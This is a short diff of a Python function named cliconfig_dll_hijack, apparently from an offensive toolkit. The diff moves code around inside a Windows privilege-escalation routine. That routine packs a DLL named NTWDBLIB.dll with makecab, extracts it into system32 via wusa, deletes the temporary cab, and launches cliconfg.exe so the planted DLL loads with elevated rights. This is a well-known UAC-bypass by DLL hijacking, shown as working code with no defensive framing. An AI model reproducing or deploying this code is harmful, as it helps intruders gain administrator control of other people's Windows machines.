@@ -36,24 +36,24 @@ def cliconfig_dll_hijack(url):
 						except Exception as error:
 							return False
 					else:
-						return False
+						try:
+							makecab = os.popen("makecab NTWDBLIB.dll NTWDBLIB.tmp")
+						except Exception as error:
+							return False	
+						try:
+							wusa = os.popen("wusa NTWDBLIB.tmp /extract:c:\windows\system32")
+						except Exception as error:
+							return False
+						try:
+							print os.remove("NTWDBLIB.tmp")
+						except Exception as error:
+							return False	
+						try:
+							win32api.ShellExecute(0,None,"c:\windows\system32\cliconfg.exe",None,None,win32con.SW_SHOW)
+						except Exception as error:
+							return False
 				else:
 					return False
-			except Exception as error:
-				try:
-					makecab = os.popen("makecab NTWDBLIB.dll NTWDBLIB.tmp")
-				except Exception as error:
-					return False	
-				try:
-					wusa = os.popen("wusa NTWDBLIB.tmp /extract:c:\windows\system32")
-				except Exception as error:
-					return False
-				try:
-					print os.remove("NTWDBLIB.tmp")
-				except Exception as error:
-					return False	
-			try:
-				win32api.ShellExecute(0,None,"c:\windows\system32\cliconfg.exe",None,None,win32con.SW_SHOW)
 			except Exception as error:
 				return False
 	else:
